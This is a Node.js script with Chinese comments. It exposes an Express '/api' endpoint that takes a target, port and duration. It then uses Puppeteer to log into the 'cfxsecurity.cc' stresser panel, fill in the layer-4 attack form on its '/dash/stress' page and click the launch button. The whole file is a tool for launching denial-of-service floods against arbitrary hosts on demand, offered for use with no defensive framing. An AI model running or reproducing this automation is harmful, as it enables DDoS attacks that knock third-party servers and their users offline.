const puppeteer = require("puppeteer-extra");
const fs = require("fs");
const fetch = require('node-fetch');
const express = require('express');
const app = express();
const port = 3000;
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
//用户名密码
const username = "";
const password = "";
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
async function main() {
    app.get('/api', (req, res) => {
        const target = req.query.target;
        const port = req.query.port;
        const time = req.query.time;

        if (target && port && time) {
            openBrowser("https://cfxsecurity.cc/login", target, port, time);
            res.send(`收到目标: ${target}, 端口: ${port}, 时间: ${time}`);
        } else {
            res.status(400).send('缺少参数');
        }
    });

    app.listen(port, () => {
        console.log(`服务器正在运行在 http://localhost:${port}`);
    });

}
async function openBrowser(targetURL, target1, port1, time1) {
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
    ];

    const randomIndex = Math.floor(Math.random() * userAgents.length);
    const randomUA = userAgents[randomIndex];
    const promise = async (resolve, reject) => {
        const options = {
            headless: false,
            ignoreHTTPSErrors: true,
            args: [
                "--no-sandbox",
                "--no-first-run",
                "--ignore-certificate-errors",
                "--disable-extensions",
                "--test-type",
                "--user-agent="
                + randomUA
            ],
            defaultViewport: {
                width: 1280,
                height: 900
            }
        };
        const browser = await puppeteer.launch(options);
        const [page] = await browser.pages();
        try {
            page.setDefaultNavigationTimeout(120 * 1000);
            await page.goto(targetURL);
            await page.waitForSelector('.form-control');
            await page.waitForSelector('button');
            const formControls = await page.$$('.form-control');
            await formControls[0].type(username);
            await formControls[1].type(password);
            await sleep(5)
            await page.click('button');
            // 等待页面加载完成
            await sleep(10 * 1000);
            await page.goto('https://cfxsecurity.cc/dash/stress');
            await sleep(10 * 1000);
            const target = await page.$x(`//*[@id="l4host"]`);
            const port = await page.$x(`//*[@id="l4port"]`);
            const time = await page.$x(`//*[@id="l4time"]`)
            await target[0].type(target1);
            await port[0].type(port1);
            await time[0].type(time1);
            await sleep(1 * 1000);
            const [element2] = await page.$x(`//*[@id="l4btn"]`);
            await sleep(1 * 1000);
            await element2.click();
        } catch (exception) {
            console.log(exception)
        } finally {
            await sleep(5 * 1000)
            await browser.close();
        }
    };
    return new Promise(promise);
}

main();